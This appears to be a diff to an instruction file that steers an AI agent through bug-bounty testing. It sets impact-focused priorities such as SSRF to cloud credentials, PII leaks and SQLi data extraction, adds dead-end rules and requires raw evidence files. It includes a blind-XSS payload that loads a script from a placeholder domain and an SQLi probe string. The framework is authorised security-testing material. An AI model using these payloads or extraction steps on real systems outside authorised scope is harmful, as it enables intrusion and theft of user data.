@@ -12,6 +12,11 @@ A pentester documents everything — defense-in-depth gaps, missing headers, the
 
 **Chase impact. Ignore the rest.**
 
+**If you cannot demonstrate real, immediate impact — it is not reportable. Do not write it up, do not flag it as a finding, do not spend more time on it.** A vulnerability with no clear impact chain is not a vulnerability for our purposes. Move on.
+
+**No proof, no finding.** A finding only exists when you have a real HTTP request and response that demonstrates it. A parameter that looks injectable is a lead. A response that leaks data, a payload that executes, a time delay that confirms blind injection — that's a finding. Theoretical attack paths, "this might be vulnerable," code that looks unsafe — none of that goes in `findings.md`. It goes in `leads.md` until you have the proof.
+
+
 What programs pay for: vulnerabilities with clear, demonstrable business impact — data exposure, account takeover, privilege escalation, unauthorized access, RCE, SSRF to internal infrastructure.
 
 What programs routinely reject (don't spend time on these):
@@ -23,7 +28,7 @@ What programs routinely reject (don't spend time on these):
 - SSL/TLS configuration issues
 - Clickjacking on pages without sensitive actions
 
-Before going deep on any finding, ask: **would a program actually pay for this?** If the answer is unclear, move on and come back if you find an escalation chain.
+Before going deep on any finding, ask: **would a program actually pay for this?** If the answer is no or unclear, stop and move on. Do not spend tokens on things programs won't pay for.
 
 ## Your Knowledge Base
 
@@ -57,6 +62,14 @@ When you need a payload or technique, invoke the corresponding skill. Do not rel
 <command here>
 ```
 Then wait for me to paste the output before continuing.
+
+### Dead End Recognition
+
+If you've sent 3 or more requests to the same endpoint/parameter with the same class of payload and the responses are not changing in any meaningful way — stop. Don't send a 4th variation of the same thing. Declare it a dead end, log it to `leads.md` as tried, and move to the next vector. Spinning on a dead end wastes tokens and time.
+
+A dead end is: same status code, same response length, same error message, no timing difference. If nothing is changing, the answer is no — move on.
+
+The only exception: if a new bypass technique from the relevant skill hasn't been tried yet. One bypass attempt per dead end, then move on regardless.
 
 ### Caido (primary proxy — replaces Burp):
 - Caido is running with the Vibe Hacking MCP plugin at `http://127.0.0.1:3333/mcp`
@@ -105,6 +118,7 @@ When crafting blind XSS payloads, always use a unique identifier in the payload 
 
 At the start of every engagement, confirm these files exist in the program folder:
 - `headers.conf` — required headers and rate limit for this program
+- `payloads.conf` — XSS payload to use for this engagement (optional but read it if present)
 - `program-guidelines.txt` — program rules, out-of-scope items, notes
 - `scope.txt` — all in-scope domains/wildcards (one per line)
 - `httpx-live.txt` — live hosts from httpx output (I will have run this already)
@@ -124,6 +138,18 @@ If any required files are missing, ask me for them before proceeding.
 **Every curl command you run must include all required headers.** No exceptions. Build them as `-H "Header: value"` flags on every request.
 
 **Never exceed the rate limit.** Pace your own curl calls. If unsure, ask before running anything that touches the target.
+
+### XSS Payload — payloads.conf
+
+If `payloads.conf` exists in the program folder, read it at session start and extract:
+- `XSS_PAYLOAD=` — the payload to use for all XSS injection points this engagement
+
+**Use this payload everywhere XSS is tested** — reflected, stored, DOM, and blind. Do not substitute a generic payload when one is configured. If the file is absent, fall back to the default ezXSS payload from the Blind XSS setup section.
+
+Example `payloads.conf`:
+```
+XSS_PAYLOAD=<script src="https://YOUR_EZXSS_DOMAIN/x"></script>
+```
 
 ---
 
@@ -156,7 +182,27 @@ When I confirm a target, run `/recon` or work through this manually:
 
 Work through this checklist against the target. For each item: invoke the relevant skill(s), identify if/where it applies, then test. Take breaks between categories and report status.
 
-**Priority order (roughly — adapt based on what the app does):**
+## Vulnerability Priority Order
+
+Always work in this order. Higher tiers convert to money reliably. Lower tiers are valid but don't burn cycles on them until the top tiers are exhausted.
+
+1. **SSRF** — internal metadata, internal services, cloud credentials. Instant critical on cloud targets.
+2. **PII exposure** — mass user data leaks (names, emails, phone numbers, addresses). Treated as critical by most programs and often easier to find than RCE.
+3. **Authentication bypass / account takeover** — any path to accessing another user's account or admin access.
+4. **RCE / blind RCE** — command injection, deserialization, SSTI with execution.
+5. **Stored XSS in high-privilege context** — admin panels, support dashboards, anything that fires on staff.
+6. **SQLi with data exfil** — not just detection, actual extraction of user/admin data.
+7. **IDOR** — valid, but integer IDORs on low-value objects are not a priority. Focus on IDORs that expose PII, allow account takeover, or touch billing/admin data.
+
+Everything else (reflected XSS, low-impact IDORs, CORS, header issues) — only if it chains into something higher up this list.
+
+---
+
+### Phase 3 — Vulnerability Checklist
+
+Work through this checklist against the target. For each item: invoke the relevant skill(s), identify if/where it applies, then test. Take breaks between categories and report status.
+
+**Checklist order (apply priority ranking above when allocating time):**
 
 #### 1. IDOR & Access Control
 - Skills: `idor`, `verb-tampering`, `mass-assignment`
@@ -274,20 +320,31 @@ category — param/field — why it's interesting
 ```
 Example: `sqli — user_id param — numeric, no sanitization visible, try 1'--`
 
-**Findings** — confirmed or high-confidence. Append to `reports/findings.md`:
+**Findings** — confirmed with proof. Append to `reports/findings.md` AND save raw evidence:
 ```markdown
 ## [vuln class] — [URL/endpoint]
 **Parameter:** [param]
 **Evidence:** [what you observed]
+**Proof:** `reports/evidence/[filename]`
 **Impact:** [business impact]
 **Next step:** [what to confirm/escalate]
 
 ---
 ```
 
-**Write discipline** — during a structured analysis (HauntMode, checklist), accumulate in memory and write once at the end. During normal conversation, write immediately when something is identified. Never overwrite — always append. Create the file if it doesn't exist.
+**Before writing up a finding**, ask: what role triggers this, and can that role reach the same data through any normal path in the app? A finding needs a privilege gap — the delta between what a role should be able to do and what it actually can. Data appearing in an API response isn't a finding if the user could get it through the UI anyway. If there's no gap, it's not worth writing up.
 
-Both files persist across context compactions so nothing is ever lost.
+**Evidence files** — every finding gets a raw evidence file saved to `reports/evidence/`. Name it descriptively so it's self-explanatory without opening it:
+```
+[vulnclass]-[endpoint-slug]-[param].txt
+```
+Examples: `sqli-api-users-id.txt`, `ssrf-webhook-url.txt`, `xss-profile-displayname.txt`
+
+Each evidence file contains the raw request and response that proves the vulnerability — copy-paste from curl output or Caido. No sanitizing, no summarizing — the raw proof.
+
+**Write discipline** — during a structured analysis (HauntMode, checklist), accumulate in memory and write once at the end. During normal conversation, write immediately when something is identified. Never overwrite — always append. Create files if they don't exist.
+
+Both `findings.md` and `leads.md` persist across context compactions so nothing is ever lost.
 
 ---
 
